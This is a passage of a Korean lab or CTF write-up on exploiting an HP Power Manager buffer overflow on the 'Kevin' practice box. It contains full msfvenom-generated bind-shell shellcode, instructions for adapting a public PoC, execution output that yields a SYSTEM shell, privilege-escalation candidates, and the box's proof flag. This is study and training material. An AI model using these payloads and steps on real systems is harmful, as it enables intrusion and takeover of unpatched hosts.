중복을 제거하면 20바이트다:

```
00 0a 0b 0d 1a 20 23 24 25 26 2b 2c 2d 2e 2f 3a 3b 3d 3f 5c
            SP  #  $  %  &  +  ,  -  .  /  :  ;  =  ?  \
```

**흔한 오해: "URL 인코딩 때문"이 아니다.** `fileName`은 `urllib.quote_plus()`로 인코딩해서 보내므로 원칙적으로 임의 바이트를 실을 수 있다(널만 예외).

**진짜 제약은 셸코드가 실리는 `Accept:` 헤더다.** 여기에는 인코딩 없이 원본 바이트가 들어간다:

| 바이트 | 왜 금지인가 |
|---|---|
| `\x00` | C 문자열 종료 — 헤더가 거기서 잘린다 |
| `\x0a` `\x0d` | LF/CR — 헤더가 끝나버린다. 요청 구조 자체가 깨진다 |
| `\x20`(SP) `\x0b` | 공백류 — HTTP 토큰 분리 |
| `\x3a`(`:`) | 헤더 이름/값 구분자 |
| `\x2c`(`,`) `\x3b`(`;`) | `Accept` 헤더의 MIME 타입/파라미터 구분자 |
| `\x2f`(`/`) | MIME 타입의 `type/subtype` 구분자 |
| 나머지 (`# $ % & + - . = ? \` `\x1a`) | 모듈 저자가 바디용·헤더용을 합친 보수적 초집합으로 보인다 `[가정 — GoAhead/HP PM의 헤더 파서를 직접 확인하지 못했다]` |

badchar 목록은 "셸코드가 어느 파서를 통과하는가"에서 나온다
**경로를 따라가며 세어라:**
- HTTP 헤더에 실린다 → `\x00 \x0a \x0d \x20` + 그 헤더의 구분자
- HTTP 바디(폼)에 실린다 → `\x00` + `&` `=` (인코딩 안 할 경우)
- URL 경로에 실린다 → `\x00 ? # / % SP`
- 파일명으로 저장된다 → `\x00 / \ : * ? " < > |`
- SQL 문자열 안 → `\x00 ' " \`

그리고 **badchar를 몰라도 찾는 법이 있다** — `\x01`부터 `\xff`까지 전 바이트를 버퍼에 넣고 크래시 시점의 메모리를 디버거로 비교한다(`!mona compare`). 시험에서 디버거를 붙일 수 있는 상황이라면 이게 정공법이다.

---

## 3. Foothold — 공개 PoC + 자체 셸코드

### 3-1. PoC 확보

```bash
┌──(kali㉿kali)-[~/Kevin]
└─$ git clone https://github.com/Muhammd/HP-Power-Manager.git
Cloning into 'HP-Power-Manager'...
remote: Enumerating objects: 6, done.
remote: Total 6 (delta 0), reused 0 (delta 0), pack-reused 6 (from 1)
Receiving objects: 100% (6/6), done.
```

`git clone`을 쓰기 전에 `searchsploit`을 먼저 쳐라 — 오프라인에서도 된다
```bash
searchsploit hp power manager
searchsploit -m windows/remote/18015.rb      # 로컬로 복사
searchsploit -x windows/remote/18015.rb      # 내용 보기
```
`searchsploit`은 **Exploit-DB 전체 사본을 로컬에 갖고 있다**(`/usr/share/exploitdb/`). 인터넷이 느리거나 막힌 시험 환경에서도 동작한다.
다만 GitHub에만 있는 변형(여기서 쓴 python2 PoC, py3 포크)은 안 나오므로 둘 다 확인하는 것이 맞다.

### 3-2. 셸코드 생성

```bash
┌──(kali㉿kali)-[~/Kevin]
└─$ msfvenom -p windows/shell_bind_tcp LHOST=192.168.49.60 LPORT=1234  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 352 (iteration=0)
x86/call4_dword_xor chosen with final size 352
Payload size: 352 bytes
Final size of python file: 1749 bytes
buf =  b""
buf += b"\x31\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e"
buf += b"\x81\x76\x0e\x88\x9f\x85\x9f\x83\xee\xfc\xe2\xf4"
buf += b"\x74\x77\x07\x9f\x88\x9f\xe5\x16\x6d\xae\x45\xfb"
buf += b"\x03\xcf\xb5\x14\xda\x93\x0e\xcd\x9c\x14\xf7\xb7"
buf += b"\x87\x28\xcf\xb9\xb9\x60\x29\xa3\xe9\xe3\x87\xb3"
buf += b"\xa8\x5e\x4a\x92\x89\x58\x67\x6d\xda\xc8\x0e\xcd"
buf += b"\x98\x14\xcf\xa3\x03\xd3\x94\xe7\x6b\xd7\x84\x4e"
buf += b"\xd9\x14\xdc\xbf\x89\x4c\x0e\xd6\x90\x7c\xbf\xd6"
buf += b"\x03\xab\x0e\x9e\x5e\xae\x7a\x33\x49\x50\x88\x9e"
buf += b"\x4f\xa7\x65\xea\x7e\x9c\xf8\x67\xb3\xe2\xa1\xea"
buf += b"\x6c\xc7\x0e\xc7\xac\x9e\x56\xf9\x03\x93\xce\x14"
buf += b"\xd0\x83\x84\x4c\x03\x9b\x0e\x9e\x58\x16\xc1\xbb"
buf += b"\xac\xc4\xde\xfe\xd1\xc5\xd4\x60\x68\xc0\xda\xc5"
buf += b"\x03\x8d\x6e\x12\xd5\xf7\xb6\xad\x88\x9f\xed\xe8"
buf += b"\xfb\xad\xda\xcb\xe0\xd3\xf2\xb9\x8f\x60\x50\x27"
buf += b"\x18\x9e\x85\x9f\xa1\x5b\xd1\xcf\xe0\xb6\x05\xf4"
buf += b"\x88\x60\x50\xf5\x80\xc6\xd5\x7d\x75\xdf\xd5\xdf"
buf += b"\xd8\xf7\x6f\x90\x57\x7f\x7a\x4a\x1f\xf7\x87\x9f"
buf += b"\x8c\x4d\x0c\x79\xe2\x8f\xd3\xc8\xe0\x5d\x5e\xa8"
buf += b"\xef\x60\x50\xc8\xe0\x28\x6c\xa7\x77\x60\x50\xc8"
buf += b"\xe0\xeb\x69\xa4\x69\x60\x50\xc8\x1f\xf7\xf0\xf1"
buf += b"\xc5\xfe\x7a\x4a\xe0\xfc\xe8\xfb\x88\x16\x66\xc8"
buf += b"\xdf\xc8\xb4\x69\xe2\x8d\xdc\xc9\x6a\x62\xe3\x58"
buf += b"\xcc\xbb\xb9\x9e\x89\x12\xc1\xbb\x98\x59\x85\xdb"
buf += b"\xdc\xcf\xd3\xc9\xde\xd9\xd3\xd1\xde\xc9\xd6\xc9"
buf += b"\xe0\xe6\x49\xa0\x0e\x60\x50\x16\x68\xd1\xd3\xd9"
buf += b"\x77\xaf\xed\x97\x0f\x82\xe5\x60\x5d\x24\x65\x82"
buf += b"\xa2\x95\xed\x39\x1d\x22\x18\x60\x5d\xa3\x83\xe3"
buf += b"\x82\x1f\x7e\x7f\xfd\x9a\x3e\xd8\x9b\xed\xea\xf5"
buf += b"\x88\xcc\x7a\x4a"
```

**플래그 해설**

| 플래그 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `-p windows/shell_bind_tcp` | 바인드 셸 — 타겟이 포트를 열고 우리가 접속 | reverse였다면 Kali에 리스너가 필요하다. 여기서는 타겟 방화벽이 없어(1-1) bind가 성립했다 |
| `LPORT=1234` | 타겟이 listen할 포트 | bind 페이로드에서 `LPORT`는 "타겟이 열 포트"다. reverse에서의 의미(내 리스너 포트)와 반대 방향이다 |
| `LHOST=192.168.49.60` | bind 페이로드에서는 무의미하다 | msfvenom이 datastore에 넣기만 하고 페이로드가 쓰지 않는다. 에러도 경고도 없다 (6장 ②) |
| `EXITFUNC=thread` | 셸 종료 시 스레드만 종료 | `process`면 `DevManBE.exe`가 죽어 서비스가 내려가고 재익스플로잇이 불가능해진다. `seh`는 예외 경로로 복귀. 이 박스처럼 프로세스를 살려둬야 하면 `thread`가 정답 |
| `-b '...'` | badchar 지정 | 지정 안 하면 셸코드에 `\x00`·`\x0a`가 들어가 헤더가 잘려 조용히 실패한다 |
| `--platform windows` | 플랫폼 명시 | 페이로드 이름으로 추론되므로 생략 가능. 명시가 안전하다 |
| `-f python` | Python 소스 형식으로 출력 | `-f c`·`-f raw`·`-f ps1` 등. PoC 언어에 맞춰야 한다 |
| 없음: `-e` | 인코더 미지정 → 자동 선택 | `x86/alpha_mixed`가 인코더로 지정되지 않았다. 출력이 그 증거다 (6장 ①) |
| 없음: `-v` | 변수명 미지정 → 기본 `buf` | PoC의 `buf` 변수와 이름이 충돌한다 (6장 ④) |

**출력을 읽는 법 — 여기에 이미 오류가 드러나 있다:**

| 출력 줄 | 무슨 뜻인가 |
|---|---|
| `[-] No arch selected, selecting arch: x86` | 아키텍처 자동 판정. 페이로드가 `windows/`(x86)이므로 맞다 |
| `Found 11 compatible encoders` | 인코더가 지정되지 않아 후보를 찾고 있다. `-e`를 줬다면 이 줄이 안 나온다 ★ |
| `Attempting to encode payload with 1 iterations of x86/shikata_ga_nai` | 랭크 순으로 자동 시도. shikata_ga_nai가 rank Excellent라 1순위 |
| `x86/shikata_ga_nai failed with A valid opcode permutation could not be found` | badchar가 많아 shikata의 다형성 엔진이 유효한 명령 조합을 못 찾았다 |
| `x86/call4_dword_xor chosen with final size 352` | 최종 인코더는 `call4_dword_xor`다. `alpha_mixed`가 아니다 ★ |

셸코드 첫 12바이트가 어느 인코더인지 말해준다
```
31 c9  83 e9 ae  e8 ff ff ff ff  c0  5e  81 76 0e ...
```
Metasploit `modules/encoders/x86/call4_dword_xor.rb`의 디코더 스텁 원문과 정확히 일치한다:
```ruby
"\xe8\xff\xff\xff" + # call $+4
"\xff\xc0" +         # inc eax
"\x5e" +             # pop esi
"\x81\x76\x0eXORK" + # xor [esi + 0xe], xork
"\x83\xee\xfc" +     # sub esi, -4
"\xe2\xf4"           # loop xor
```
**`alpha_mixed`였다면 출력이 `PYIIIIIIIIIIIIIIII7QZjA...` 같은 순수 ASCII여야 한다.** 전혀 그렇지 않다.
**셸코드를 눈으로 검증하는 습관**이 이런 오류를 잡는다 — [[Osaka]]에서 셸코드 안의 LHOST/LPORT/`cmd\0`를 직접 찾아 확인한 것과 같은 규율이다.

### 3-3. 셸코드를 PoC에 이식

PoC의 해당 부분(공개 저장소 원문):

```python
#msfvenom -p windows/shell_bind_tcp LHOST=10.11.0.55 LPORT=1234  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python

egg="b33fb33f"
buf= egg
buf += "\x31\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81"
...
```

**`## TODO: adjust`가 가리키는 것 — 실제로 고쳐야 하는 곳:**

| # | 고칠 것 | 왜 |
|---|---|---|
| 1 | `buf`의 셸코드 전체 | 저장소 것은 저자의 LPORT 1234 bind shell. 자기 것으로 교체 |
| 2 | `os.system("nc -nv " + HOST + " 1234")`의 포트 | 셸코드의 `LPORT`와 반드시 일치해야 한다. 두 군데를 따로 고치는 구조라 놓치기 쉽다 |
| 3 | `PORT = 80` | 타겟 웹 포트. 이 박스는 80이라 그대로 |
| 4 | `time.sleep(30)` | 에그헌터 스캔 시간. 저자가 파일 끝에 "안 되면 60으로" 주석을 남겼다 |
| 5 | Kali에 `nc`가 설치돼 있어야 한다 | 스크립트가 `os.system`으로 호출한다 |

> [!danger] `buf = b""`를 그대로 붙여넣으면 에그(egg)가 날아간다 ★
> msfvenom `-f python` 출력의 첫 줄은 `buf =  b""` — 대입문이다.
> PoC는 `buf = egg` 로 시작해서 `buf += 셸코드`로 이어붙인다. msfvenom 출력을 통째로 붙여넣으면 `b33fb33f` 태그가 지워진다.
> 그러면 에그헌터가 메모리를 아무리 훑어도 태그를 못 찾아 **영원히 스캔만 하고 셸이 안 붙는다.** 크래시도 에러도 없이 조용히 실패한다.
>
> **올바른 이식 방법 셋:**
> 1. msfvenom 출력의 첫 줄 `buf = b""`만 지우고 나머지 `buf += ...`를 `buf = egg` 아래에 붙인다
> 2. 또는 `-v shellcode`로 변수명을 바꿔 생성한 뒤 `buf = egg + shellcode` 로 조립한다
> 3. python2 PoC라면 `b""` 접두사를 지운다 (py2에서는 `b""`가 그냥 `str`이라 지우지 않아도 동작한다)
>
> **이식 후 반드시 확인**: `python2 -c "execfile('hpm_exploit.py')"` 대신, 스크립트에 `print len(buf), repr(buf[:8])`를 임시로 넣어 `b33fb33f`로 시작하는지 눈으로 본다.
>
> `[가정]` — 실제로 어떤 방법으로 이식했는지는 기록에 없다. 익스플로잇이 성공했으므로 에그는 보존됐다는 것만 확정이다.

### 3-4. 익스플로잇 실행

```bash
┌──(kali㉿kali)-[~/Kevin/HP-Power-Manager]
└─$ python2 hpm_exploit.py 192.168.60.45

##//#############################################################################################################
##                                                      ##                                               #
## Vulnerability: HP Power Manager 'formExportDataLogs' ##  FormExportDataLogs Buffer Overflow           #
##                                                      ##  HP Power Manager                             #
## Vulnerable Application: HP Power Manager             ##  This is a part of the Metasploit Module,     #
## Tested on Windows [Version 6.1.7600]                 ##  exploit/windows/http/hp_power_manager_filename#
##                                                      ##                                               #
## Author: Muhammad Haidari                             ##  Spawns a shell to same window                #
## Contact: ghmh@outlook.com                            ##                                               #
## Website: www.github.com/muhammd                      ##                                               #
##                                                      ##                                               #
##//#############################################################################################################
##
##
## TODO: adjust
##
## Usage: python hpm_exploit.py <Remote IP Address>

[+] Payload Fired... She will be back in less than a min...
[+] Give me 30 Sec!
(UNKNOWN) [192.168.60.45] 1234 (?) open
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

**한 줄씩 무슨 일이 일어난 것인가:**

| 출력 | 내부 동작 |
|---|---|
| `Tested on Windows [Version 6.1.7600]` | 배너가 이 박스와 정확히 같은 빌드를 명시한다. 익스플로잇을 고를 때의 강한 신호였다 |
| `[+] Payload Fired...` | `POST /goform/formExportDataLogs` 전송. `fileName`에 SEH 오버플로우, `Accept:`에 에그+셸코드 |
| `[+] Give me 30 Sec!` | `time.sleep(30)`. 에그헌터가 프로세스 메모리를 훑는 시간이다. 대기가 아니라 실제로 필요한 시간 |
| `(UNKNOWN) [192.168.60.45] 1234 (?) open` | `nc -nv`의 출력이다. 스크립트가 `os.system("nc -nv 192.168.60.45 1234")`으로 붙었다. `(UNKNOWN)`은 역방향 DNS 실패(`-n` 때문), `(?)`는 1234에 등록된 서비스명이 없다는 뜻 |
| `Microsoft Windows [Version 6.1.7600]` | 셸코드가 `cmd.exe`를 띄웠다 |
| `whoami` 가 두 번 보임 | 에코가 없는 원시 소켓 셸이라 내가 친 글자가 그대로 되돌아온다. `nc` 셸의 정상 현상 |
| `nt authority\system` | 처음부터 SYSTEM이다. `DevManBE.exe`가 SYSTEM 서비스로 돌기 때문 |

`nc` 원시 셸의 한계 — 무엇이 안 되는지 알고 있어라
- Ctrl+C를 누르면 셸이 죽는다 (nc가 끊긴다). 명령을 중단할 방법이 없으니 `dir /s`처럼 오래 걸리는 걸 조심
- 대화형 프로그램이 안 된다 — `runas`, `net user` 확인 프롬프트, 편집기
- 탭 완성·방향키 히스토리 없다
- Linux 방식 TTY 업그레이드가 Windows에는 없다. `python3 -c 'import pty'`는 해당 없다
- 개선하려면 Kali 쪽에서 `rlwrap nc -nv <ip> 1234`로 붙어 히스토리·행 편집을 얻는다. **이것이 Windows 셸에서 유일하게 쉬운 개선**이다

---

## 4. 권한상승 — 필요 없었다

```
C:\Windows\system32>whoami
nt authority\system
```

**`DevManBE.exe`가 SYSTEM 권한 Windows 서비스로 실행되기 때문**에, 그 프로세스 안에서 실행된 셸코드도 SYSTEM이다. Metasploit 모듈이 `'Privileged' => false`로 선언한 것은 "익스플로잇 실행에 특권이 필요 없다"는 뜻이지 결과 권한이 낮다는 뜻이 아니다.

셸을 잡으면 권한부터 확인하고, SYSTEM이면 열거를 건너뛴다
Windows 셸 첫 3개 명령:
```cmd
whoami
whoami /priv
whoami /groups
```
`nt authority\system`이 나오면 거기서 끝이다. 권한상승 열거(`winPEAS`·서비스 권한·AlwaysInstallElevated)를 돌릴 이유가 없다.
[[Squid]]와 정반대 상황이다 — 거기서는 `LOCAL SERVICE`로 떨어져 FullPowers → PrintSpoofer 두 단계가 필요했다. **`whoami` 한 줄이 그 갈림길을 결정한다.**

**만약 SYSTEM이 아니었다면** (Windows 7 7600 기준 후보 순서):

1. `whoami /priv` → `SeImpersonatePrivilege` 있으면 → Potato 계열. 단 Win7 7600은 구형이라 **JuicyPotato가 동작한다**(빌드 17763 이상에서 죽은 것과 대비)
2. 커널 익스플로잇 — 7600은 SP1도 안 올라간 RTM이라 MS10-015(KiTrap0D)·MS10-092(Task Scheduler)·MS11-046 등이 그대로 산다. `systeminfo` → Windows Exploit Suggester
3. `sc query` / `accesschk` → 서비스 바이너리 경로 권한·따옴표 없는 서비스 경로(unquoted service path)
4. `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` → 1이면 msi 페이로드
5. `C:\Users\*\` 아래 설정 파일·`Unattend.xml`·`sysprep.inf`의 평문 자격증명

---

## 5. 플래그

```
C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A451-A4B1

 Directory of C:\Users\Administrator\Desktop

07/09/2020  07:24 PM    <DIR>          .
07/09/2020  07:24 PM    <DIR>          ..
06/29/2026  08:59 PM                34 proof.txt
               1 File(s)             34 bytes
               2 Dir(s)   1,783,939,072 bytes free

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
4b506d7e0c989b3b7053f9081881a8d3
```

| 플래그 | 경로 | 값 |
|---|---|---|
| proof | `C:\Users\Administrator\Desktop\proof.txt` | `4b506d7e0c989b3b7053f9081881a8d3` |

**표준 위치다.** `C:\Users\Administrator\Desktop\proof.txt`는 PG Windows 박스의 관례적 위치이고, SYSTEM 권한이면 바로 읽힌다. (표준 위치가 아닌 사례로는 [[Squid]]의 `C:\local.txt`가 있다.)

플래그를 못 찾으면 — `-Recurse`를 쓰지 마라
```cmd
dir C:\Users\*\Desktop\*.txt /s /b
where /r C:\Users proof.txt
where /r C:\ local.txt
dir C:\ /b                        ← 루트에 덩그러니 있는 경우가 있다
```
PowerShell `Get-ChildItem -Recurse`는 셸을 몇 분간 블로킹시키고, `nc` 원시 셸에서는 Ctrl+C가 셸을 죽이므로 **빠져나올 방법이 없다.**

> [!danger] 시험 증거 형식 — 위 기록에는 필수 요소가 빠져 있다
> OSCP는 플래그를 **`whoami` · `hostname` · `ipconfig`와 한 화면에** 요구한다. 위 세션에는 `hostname`도 `ipconfig`도 없다 — **시험이었다면 감점이다.**
> Windows용 한 줄로 굳혀라 (`ip a`가 아니라 `ipconfig`):
> ```cmd
> whoami & hostname & ipconfig & type C:\Users\Administrator\Desktop\proof.txt
> ```
> `cmd`에서는 `&`가 순차 실행 구분자다(`;`가 아니다). 셸을 잡자마자 이걸 치고 스크린샷을 남긴다.

**기록의 공백**: 위 출력은 `C:\Windows\system32>whoami` 다음에 곧바로 `C:\Users\Administrator>cd Desktop`으로 이어진다. `system32`에서 `C:\Users\Administrator`로 이동한 명령이 원 노트에 남아 있지 않다. (`cd \Users\Administrator` 였을 것이나 재현하지 않았으므로 적지 않는다.)

---

## 6. 막혔던 지점 / 시행착오

이 장의 성격
Kevin은 실행 자체는 한 번에 성공한 박스다. Kali에 산출물도 남아 있지 않아 실패한 시도의 로그가 없다.
그래서 이 장은 기록에 남은 명령 자체에 들어 있는 결함을 해부한다. 전부 msfvenom 출력·PoC 소스·Metasploit 모듈 원문으로 확정한 것이고, **결함이 있는데도 우연히 통한 이유**까지 밝힌다.
**"우연히 통한 명령"은 다음 박스에서 반드시 실패한다.** 그게 이 장의 가치다.

### ① `-e`가 빠져서 `x86/alpha_mixed`가 인코더로 지정되지 않았다 ★

```bash
msfvenom -p windows/shell_bind_tcp ... -b '...' x86/alpha_mixed --platform windows -f python
                                                ^^^^^^^^^^^^^^^
                                                -e 가 없다
```

msfvenom은 에러를 내지 않는다. 옵션 파싱 후 남은 인자를 datastore 대입으로 처리하기 때문이다 (msfvenom 소스):

```ruby
if args
  args.each do |x|
    k,v = x.split('=', 2)
    datastore[k.upcase] = v.to_s
```

`x86/alpha_mixed`에는 `=`가 없으므로 `k = "x86/alpha_mixed"`, `v = nil.to_s = ""`가 되어 **`datastore["X86/ALPHA_MIXED"] = ""` 라는 쓰레기 키로 조용히 삼켜진다.**

**증거는 출력에 그대로 있다:**

```
Found 11 compatible encoders                                    ← 인코더 자동 탐색 중
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor chosen with final size 352                  ← 최종 인코더
```

`-e`를 명시했다면 `Found N compatible encoders`도, 랭크 순 시도도 나오지 않는다. `-b`만 주고 `-e`를 안 주면 msfvenom이 랭크 순으로 자동 선택하는데, 그 과정이 그대로 찍힌 것이다.

왜 그래도 성공했는가: `call4_dword_xor`는 **self-locating 디코더**다. `call $+4` → `pop esi`로 자기 주소를 스스로 구하므로, 모듈이 지정한 `BufferRegister => EDI` 같은 도움이 필요 없다. `alpha_mixed`였다면 디코더가 셸코드 시작 주소를 담은 레지스터를 알아야 했고, 에그헌터의 `jmp edi` 덕분에 EDI가 그 역할을 했을 것이다. **두 경로 모두 성립하지만, 성립한 이유가 다르다.**

> [!danger] msfvenom은 잘못된 인자를 조용히 삼킨다 — 출력으로 검증하라
> **`-e`를 준 것과 안 준 것을 출력으로 구별하는 법:**
> ```
> -e 있음 :  Found 1 compatible encoders
>            Attempting to encode payload with 1 iterations of x86/alpha_mixed
>            x86/alpha_mixed succeeded with size ...
>
> -e 없음 :  Found 11 compatible encoders           ← 복수형이면 자동 선택이다
>            ... chosen with final size ...          ← "chosen"이라는 단어
> ```
> **`chosen`이라는 단어가 보이면 msfvenom이 골랐다는 뜻이다.** 내가 골랐다면 `chosen`이 아니라 `succeeded`만 나온다.

### ② `windows/shell_bind_tcp`에 `LHOST`를 준 것은 무의미하다

```
msfvenom -p windows/shell_bind_tcp LHOST=192.168.49.60 LPORT=1234 ...
                                   ^^^^^^^^^^^^^^^^^^^ 쓰이지 않는다
```

**bind 페이로드는 LHOST를 갖지 않는다.** 유효 옵션은 `LPORT`(타겟이 열 포트)와 선택적 `RHOST`(바인딩할 인터페이스)뿐이다. msfvenom은 `LHOST=192.168.49.60`을 datastore에 넣기만 하고 셸코드는 참조하지 않는다 — **경고도 없다.**

**bind와 reverse의 방향을 헷갈리면 셸이 절대 안 붙는다:**

| | `shell_bind_tcp` (이 박스) | `shell_reverse_tcp` |
|---|---|---|
| 누가 listen | 타겟 | 공격자(Kali) |
| 누가 connect | 공격자 | 타겟 |
| `LHOST` | 없음 (무의미) | 필수 — Kali의 VPN IP |
| `LPORT` | 타겟이 열 포트 | Kali 리스너 포트 |
| 공격자 쪽 준비 | 없음. 익스플로잇 후 `nc <타겟> <LPORT>` | 먼저 `nc -lvnp <LPORT>` |
| 언제 쓰나 | 타겟 인바운드가 열려 있을 때 | 타겟 아웃바운드가 열려 있을 때 (더 흔함) |

이 박스에서 bind가 옳은 선택이었던 근거는 nmap의 `Not shown: 65523 closed tcp ports (reset)`이다(1-1). 방화벽이 없으니 타겟이 연 1234에 곧바로 붙을 수 있다. **[[Twiggy]]는 정반대로 전 포트가 `filtered`였고 리버스셸이 실패했다** — 그 박스에서는 bind도 안 됐을 것이다.

bind와 reverse 중 무엇을 쓸지는 nmap 요약 한 줄이 정한다
- `closed ... (reset)` → 방화벽 없음 → bind도 reverse도 된다. bind가 리스너 관리가 없어 더 편하다
- `filtered ... (no-response)` → 방화벽 있음 → bind는 거의 불가능. reverse를 쓰되 **443/53/80** 같은 흔한 아웃바운드 포트로
- 둘 다 안 되면 → 셸을 포기하고 파일 쓰기·스케줄 작업·자격증명 탈취로 전환한다

### ③ `-b` 목록의 `\x5`는 `0x05`를 뜻하지 않는다 — `\x5c`의 오타다 ★

```
-b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5'
                                                        ^^^ 한 자리
```

현행 msfvenom은 `-b`를 `Rex::Text.dehex`로 파싱한다:

```ruby
def self.dehex(str)
  regex = /\x5cx[0-9a-f]{2}/nmi
  if str.match(regex)
    str.gsub(regex) { |x| x[2,2].to_i(16).chr }
```

**정규식이 정확히 두 자리 hex를 요구한다.** `\x5`는 매치되지 않고 리터럴 세 글자 `\`(0x5C), `x`(0x78), `5`(0x35)로 남는다.

**실제로 금지된 바이트 vs 금지했어야 할 바이트** (직접 계산):

```
이 명령의 실제 결과 : 00 0a 0b 0d 1a 20 23 25 26 2b 2f 35 3a 3f 5c 78
Metasploit 모듈 정본: 00 0a 0b 0d 1a 20 23 24 25 26 2b 2c 2d 2e 2f 3a 3b 3d 3f 5c

모듈엔 있는데 빠뜨린 것 : 24($)  2c(,)  2d(-)  2e(.)  3b(;)  3d(=)
명령에만 있는 엉뚱한 것 : 35('5')  78('x')
```

**`,`(0x2c)와 `;`(0x3b)를 빠뜨린 것이 실질적 위험이다.** 둘 다 `Accept:` 헤더의 MIME 구분자라 셸코드에 들어가면 헤더 파싱이 깨진다(2-8). 이번에는 `call4_dword_xor` 출력에 우연히 그 바이트가 안 들어갔을 뿐이다 `[가정 — 352바이트를 전수 대조하지는 않았다]`.

어디서 온 오타인가: 공개 PoC 소스의 주석에 **이미 같은 오타가 있다.**

```python
#msfvenom -p windows/shell_bind_tcp LHOST=10.11.0.55 LPORT=1234  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python
```

`-e` 누락도, `LHOST` 무의미도, `\x5` 오타도 **전부 PoC 주석을 그대로 복사한 결과**다.

> [!danger] PoC 주석의 msfvenom 명령을 그대로 복사하지 마라
> **PoC 주석은 검증된 명령이 아니다.** 저자가 자기 환경에서 한 번 성공한 기록일 뿐이고, 오타가 그대로 박제돼 수년간 복사된다.
> **올바른 절차:**
> 1. **Metasploit 모듈의 `BadChars`를 정본으로 삼는다** — `/usr/share/metasploit-framework/modules/exploits/.../*.rb`를 직접 열어 본다
> 2. 모듈이 없으면 셸코드가 통과하는 파서를 직접 세어 목록을 만든다(2-8)
> 3. `-e`를 항상 명시한다
> 4. 생성 후 셸코드에 badchar가 실제로 없는지 확인한다:
>    ```bash
>    msfvenom ... -f raw -o sc.bin
>    for b in 00 0a 0b 0d 1a 20 2c 3a 3b 2f 5c; do \
>      printf "%s: " $b; xxd -p sc.bin | tr -d '\n' | grep -o "$b" | wc -l; done
>    ```
>    **0이 아닌 줄이 있으면 그 badchar가 안 걸러진 것이다.**
>
> 이 박스의 정본은:
> ```
> -b '\x00\x0a\x0b\x0d\x1a\x20\x23\x24\x25\x26\x2b\x2c\x2d\x2e\x2f\x3a\x3b\x3d\x3f\x5c'
> ```

### ④ `-v`를 안 줘서 변수명이 `buf`가 됐다 — PoC의 `buf`와 충돌한다 ★

msfvenom `-f python`의 기본 변수명은 `buf`이고, 출력 첫 줄이 대입문이다:

```python
buf =  b""
buf += b"\x31\xc9..."
```

PoC는 이렇게 시작한다:

```python
egg="b33fb33f"
buf= egg
buf += "\x31\xc9\x83\xe9\xae..."
```

**msfvenom 출력을 통째로 붙여넣으면 `buf = b""`가 `buf = egg`를 덮어써서 태그 `b33fb33f`가 사라진다.**

**증상이 최악이다:**
- 익스플로잇은 정상 전송된다 (HTTP 200 또는 무응답)
- SEH 오버플로우도 성공한다
- 에그헌터도 정상 실행된다
- 그런데 태그가 메모리에 없으므로 영원히 스캔만 한다
- 크래시도, 에러 메시지도, 로그도 없다. `nc`가 그냥 안 붙는다

이 상태에서 "오프셋이 틀렸나", "리턴 주소가 안 맞나", "OS가 달라서인가"를 의심하기 시작하면 **몇 시간이 날아간다.**

**예방책:**

```bash
msfvenom ... -v shellcode -f python      # 변수명을 다르게
```
그리고 PoC에서 `buf = egg + shellcode`로 조립한다. 또는 붙여넣은 뒤 검증:

```python
print len(buf), repr(buf[:8])    # 'b33fb33f' 로 시작해야 한다
```

누적 패턴 — **"조용한 실패가 가장 비싸다"**
[[Twiggy]]의 `Successfully scheduled job`(작업 예약 ≠ 실행), [[Squid]]의 `certutil ... completed successfully`(파일은 삭제됨)와 같은 계열이다.
여기서는 아예 아무 메시지도 없다. 그래서 더 위험하다.
**규율: 페이로드를 조립했으면 보내기 전에 조립 결과를 출력해서 눈으로 본다.** 길이 · 시작 바이트 · 끝 바이트 세 가지면 충분하다.

### ⑤ python2가 필요하다 — Kali 최신 이미지에는 기본으로 없다

```bash
python2 hpm_exploit.py 192.168.60.45
```

PoC가 python2를 요구하는 이유 세 가지:

| 문법 | py2 | py3에서 어떻게 되나 |
|---|---|---|
| `print """..."""` · `print "%s" % x` | print 문 | `SyntaxError` |
| `urllib.quote_plus` | `urllib` 모듈 직속 | `urllib.parse.quote_plus`로 이동 |
| `str` = `bytes` | `"\x41"*689 + shellcode`를 그냥 `s.send()` | `str`과 `bytes`가 분리 → 전부 `bytes`로 만들고 `.encode('latin-1')` 처리 필요 |

세 번째가 가장 성가시다. **py3에서는 `"\x41"`이 유니코드 문자열이라 `\x80` 이상 바이트가 UTF-8로 2바이트가 되어 페이로드가 조용히 망가진다.**

> [!warning] 최신 Kali에는 `python2`가 없다
> Kali는 2021년경부터 python2를 기본 제외했다. `python2: command not found`가 나오면:
> 1. py3 포크를 찾는다 — 이 익스플로잇은 `CountablyInfinite/HP-Power-Manager-Buffer-Overflow-Python3`가 있다 (reverse shell 방식)
> 2. `sudo apt install python2` (저장소에 남아 있으면)
> 3. 직접 포팅한다 — 핵심은 세 가지뿐이다:
>    - `print(...)` 괄호
>    - `from urllib.parse import quote_plus`
>    - 모든 페이로드 문자열을 `b"..."` 바이트 리터럴로, 조립 결과를 `s.send(payload.encode('latin-1'))`
